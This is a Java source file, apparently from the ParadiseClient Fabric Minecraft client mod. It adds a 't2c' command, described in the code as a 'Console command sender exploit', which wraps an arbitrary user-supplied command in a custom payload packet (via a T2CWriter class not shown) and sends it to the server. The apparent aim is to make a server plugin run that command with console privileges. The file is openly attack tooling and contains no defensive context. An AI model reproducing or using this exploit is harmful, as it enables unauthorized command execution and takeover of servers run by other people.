package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket;
import net.minecraft.server.command.ServerCommandSource;

public class T2C extends Command {
    public T2C(MinecraftClient mc) {
        super("t2c", "Console command sender exploit", mc);
    }

    @Override
    public LiteralArgumentBuilder<ServerCommandSource> build() {
        return LiteralArgumentBuilder.<ServerCommandSource>literal(this.getName())
                .executes(this::incomplete)
                .then(com.mojang.brigadier.builder.RequiredArgumentBuilder.<ServerCommandSource, String>argument("command", StringArgumentType.greedyString())
                        .executes(this::sendPayload));
    }

    private int sendPayload(CommandContext<?> context) {
        String command = context.getArgument("command", String.class);
        Helper.sendPacket(new CustomPayloadC2SPacket(new T2CWriter(command)));
        Helper.printChatMessage("Payload sent!");
        return 1;
    }

    private int incomplete(CommandContext<?> context) {
        Helper.printChatMessage("Incomplete command!");
        return 1;
    }
}
